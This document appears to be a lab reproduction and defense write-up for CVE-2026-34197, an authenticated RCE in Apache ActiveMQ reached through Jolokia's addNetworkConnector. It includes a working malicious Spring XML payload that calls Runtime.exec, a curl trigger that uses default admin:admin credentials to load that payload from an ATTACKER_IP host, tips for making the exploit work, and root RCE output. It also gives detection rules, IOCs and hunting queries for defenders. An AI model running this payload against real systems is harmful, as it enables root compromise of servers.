# CVE-2026-34197 — Apache ActiveMQ Jolokia Remote Code Execution

> Lab Reproduction | vulhub/activemq:6.2.2 | 2026-05-24

**Outcome**: Authenticated RCE via Jolokia JMX → addNetworkConnector → Spring XML injection.

---

## 1. CVE Background & Impact

| Field | Value |
|-------|-------|
| CVE | CVE-2026-34197 |
| Affected | Apache ActiveMQ Classic < 5.19.6, 6.0.0–6.2.4 |
| CVSS | 8.8 (High) |
| Prerequisites | Jolokia API reachable + valid credentials (default admin/admin) |
| Type | CWE-502 / Spring XML injection |
| Patched | 5.19.6, 6.2.5 — vm:// transport blocked in addNetworkConnector |

**Attack chain**: Jolokia JMX-HTTP bridge → `addNetworkConnector` → `vm://` triggers broker creation → `brokerConfig=xbean:http://...` loads remote Spring XML → `MethodInvokingFactoryBean` → `Runtime.exec()`.

## 2. Reproduction Steps

### 2.1 Start target

```bash
cd vulhub/activemq/CVE-2026-34197 && docker compose up -d
# Web: http://127.0.0.1:8161 (admin/admin)
```

### 2.2 Serve malicious Spring XML

```xml
<beans xmlns="http://www.springframework.org/schema/beans" ...>
  <bean id="exec" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="targetObject">
      <bean class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetClass" value="java.lang.Runtime"/>
        <property name="targetMethod" value="getRuntime"/>
      </bean>
    </property>
    <property name="targetMethod" value="exec"/>
    <property name="arguments">
      <list>
        <array value-type="java.lang.String">
          <value>/bin/bash</value><value>-c</value>
          <value><![CDATA[COMMAND_HERE]]></value>
        </array>
      </list>
    </property>
  </bean>
</beans>
```

### 2.3 Trigger via Jolokia

```bash
curl -u admin:admin -X POST http://127.0.0.1:8161/api/jolokia \
  -H "Content-Type: application/json" \
  -d '{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost",
       "operation":"addNetworkConnector",
       "arguments":["static:(vm://rce?brokerConfig=xbean:http://ATTACKER_IP:PORT/payload.xml)"]}'
```

**Pitfalls**:
- URI must nest: `static:(vm://...)`, not bare `vm://`
- Scheme is `xbean:`, not `xml:`
- `&` and `>` in XML command must use `<![CDATA[...]]>`
- Operation name has **no type signature** (just `addNetworkConnector`)

### 2.4 Evidence

```
$ python3 exploit.py --rhost 127.0.0.1 --lhost 192.168.52.145 --cmd "id > /tmp/pwned"
[+] Jolokia: status=200 val=NC
[+] RCE CONFIRMED: uid=0(root) gid=0(root)
```

## 3. Defense

### 3.1 Hardening / Patches / Mitigations

| # | Measure | Priority |
|---|---------|----------|
| 1 | Upgrade to ActiveMQ 5.19.6+ or 6.2.5+ | **Critical** |
| 2 | Change default `admin:admin` credentials | High |
| 3 | IP-allowlist Jolokia API at reverse proxy / firewall | High |
| 4 | Configure `jolokia-access.xml` to restrict MBean operations | Medium |
| 5 | Disable `/api/jolokia/*` in `web.xml` if unused | Medium |
| 6 | WAF rule: block requests containing `brokerConfig=xbean` | Medium |
| 7 | Egress filtering: prevent ActiveMQ from initiating outbound HTTP | Low |

### 3.2 Detection (Narrative)

- **Suricata/Snort**: Alert on POST to `/api/jolokia` with `addNetworkConnector` + `brokerConfig=xbean` in body
- **Falco**: Monitor the ActiveMQ Java process for outbound HTTP connections or `bash -c` child processes
- **WAF (ModSecurity)**: Detect embedded `xbean:http` URIs in request bodies
- **ActiveMQ logs**: Search for `WARN | Could not connect to remote URI` containing `brokerConfig=xbean:` — should never appear in normal operations

### 3.3 Threat Hunting (Narrative)

- **Filesystem**: Check `/tmp/`, `/dev/shm/` for unexpected executables or webshells
- **Processes**: Look for `bash -c`, `curl`, `wget` children of the ActiveMQ JVM process
- **Network**: Audit outbound HTTP connections from the ActiveMQ server
- **Jolokia audit**: Review `/api/jolokia` POST operations for `addNetworkConnector`/`removeNetworkConnector`

### 3.4 SOC Artifacts

#### Sigma Rule

```yaml
title: CVE-2026-34197 ActiveMQ Jolokia addNetworkConnector RCE
id: c72f3a0d-8f91-4e2c-9b35-a1e6f3c9d8b4
status: experimental
logsource:
  category: webserver
  service: activemq
detection:
  selection_method:
    cs-method: POST
    cs-uri-query|contains: '/api/jolokia'
  selection_body:
    cs-body|contains|all: ['addNetworkConnector','brokerConfig','xbean']
  condition: selection_method and selection_body
tags: [attack.t1190, attack.execution, cve.2026.34197]
level: critical
```

#### Suricata Rule

```
alert http $HOME_NET any -> $HOME_NET any (
    msg: "CVE-2026-34197 ActiveMQ Jolokia addNetworkConnector RCE";
    flow: to_server, established;
    http.method; content: "POST"; nocase;
    http.uri; content: "/api/jolokia"; nocase;
    http.request_body; content: "addNetworkConnector"; nocase;
    http.request_body; content: "brokerConfig"; nocase;
    http.request_body; content: "xbean"; nocase;
    reference: cve,2026.34197;
    classtype: attempted-admin;
    sid: 2026034197; rev: 1;
)
```

#### IOC Table

| Type | Indicator | Confidence | Notes |
|------|-----------|------------|-------|
| IP:Port | ATTACKER_IP:8888 | High | HTTP server hosting payload.xml |
| URL | `http://ATTACKER_IP:*/payload.xml` | High | Spring XML payload path |
| URI Pattern | `vm://rce?brokerConfig=xbean:http://` | High | Attack URI signature |
| HTTP Body | `"operation":"addNetworkConnector"` | Medium | Jolokia exec operation |

#### SIEM Hunting Queries

**Splunk SPL**:
```spl
index=web sourcetype=activemq_access uri_path="/api/jolokia" method=POST
| search request_body="*addNetworkConnector*"
| table _time client_ip uri_path request_body
```

**Microsoft Sentinel KQL**:
```kql
CommonSecurityLog
| where RequestURL contains "/api/jolokia"
    and RequestMethod == "POST"
    and RequestBody contains "addNetworkConnector"
    and RequestBody contains "brokerConfig"
| project TimeGenerated, SourceIP, RequestURL, RequestBody
```

## 4. References

- [Horizon3 Attack Research — CVE-2026-34197](https://horizon3.ai/attack-research/disclosures/cve-2026-34197-activemq-rce-jolokia/)
- [Apache ActiveMQ Security Advisory](https://activemq.apache.org/security-advisories.data/CVE-2026-34197-announcement.txt)
- [vulhub/activemq/CVE-2026-34197](https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2026-34197)
